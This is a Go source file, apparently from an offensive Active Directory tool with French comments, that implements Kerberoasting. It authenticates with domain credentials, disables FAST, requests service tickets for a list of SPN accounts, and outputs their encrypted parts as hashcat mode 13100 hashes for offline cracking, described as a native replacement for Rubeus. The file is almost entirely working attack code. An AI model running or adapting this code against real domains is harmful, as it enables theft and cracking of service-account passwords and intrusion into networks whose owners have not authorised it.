// pkg/kerberos/kerberos.go

package kerberos

import (
	"fmt"
	"strings"

	"github.com/jcmturner/gokrb5/v8/client"
	"github.com/jcmturner/gokrb5/v8/config"
)

// KerberoastResult résultat d'un Kerberoasting sur un compte SPN
type KerberoastResult struct {
	Username string
	SPN      string
	Hash     HashcatHash // prêt pour hashcat mode 13100
	Error    string
}

// SPNTarget représente un compte avec un SPN kerberoastable
type SPNTarget struct {
	Username string
	SPN      string
}

// ============================================================
// GetServiceTicket — natif Go (remplace Rubeus.exe)
// ============================================================

// GetServiceTicket demande un ticket de service pour le SPN donné.
// Retourne le hash hashcat mode 13100 directement.
func GetServiceTicket(username, domain, password, spn string) (string, error) {
	realm := strings.ToUpper(domain)
	cfg, err := config.NewFromString(buildKrb5Config(realm, ""))
	if err != nil {
		return "", fmt.Errorf("kerberos config error: %v", err)
	}

	cl := client.NewWithPassword(username, realm, password, cfg,
		client.DisablePAFXFAST(true))

	if err := cl.Login(); err != nil {
		return "", fmt.Errorf("authentication failed: %v", err)
	}

	tkt, _, err := cl.GetServiceTicket(spn)
	if err != nil {
		return "", fmt.Errorf("TGS request failed for %s: %v", spn, err)
	}

	// CORRECTION : Conversion int32 → int
	hash := FormatKerberoastHash(username, domain, spn, tkt.EncPart.Cipher, int(tkt.EncPart.EType))
	return hash.Hash, nil
}

// ============================================================
// KerberoastTargets — attaque complète avec liste de SPNs
// ============================================================

// KerberoastTargets envoie des TGS-REQ pour chaque SPN et retourne les hashes hashcat.
func KerberoastTargets(username, domain, password, dcIP string, spnTargets []SPNTarget) ([]KerberoastResult, error) {
	realm := strings.ToUpper(domain)

	cfg, err := config.NewFromString(buildKrb5Config(realm, dcIP))
	if err != nil {
		return nil, fmt.Errorf("kerberos config error: %v", err)
	}

	cl := client.NewWithPassword(username, realm, password, cfg,
		client.DisablePAFXFAST(true))

	if err := cl.Login(); err != nil {
		return nil, fmt.Errorf("authentication failed: %v", err)
	}

	fmt.Printf("[*] Requesting TGS for %d SPN(s)...\n", len(spnTargets))

	var results []KerberoastResult
	for _, target := range spnTargets {
		fmt.Printf("[*] TGS-REQ → %-20s  SPN: %s ... ", target.Username, target.SPN)

		tkt, _, err := cl.GetServiceTicket(target.SPN)
		if err != nil {
			fmt.Printf("FAILED: %v\n", err)
			results = append(results, KerberoastResult{
				Username: target.Username,
				SPN:      target.SPN,
				Error:    err.Error(),
			})
			continue
		}

		// CORRECTION : Conversion int32 → int
		hash := FormatKerberoastHash(target.Username, domain, target.SPN,
			tkt.EncPart.Cipher, int(tkt.EncPart.EType))

		fmt.Printf("OK (enctype %d)\n", hash.EncType)
		fmt.Printf("  %s\n", hash.Hash)

		results = append(results, KerberoastResult{
			Username: target.Username,
			SPN:      target.SPN,
			Hash:     hash,
		})
	}

	return results, nil
}

// ============================================================
// Helper : domainToBaseDN
// ============================================================

// domainToBaseDN convertit un nom de domaine en DN LDAP
// Exemple: "lab.local" → "DC=lab,DC=local"
func domainToBaseDN(domain string) string {
	parts := strings.Split(domain, ".")
	var dnParts []string
	for _, part := range parts {
		dnParts = append(dnParts, "DC="+part)
	}
	return strings.Join(dnParts, ",")
}
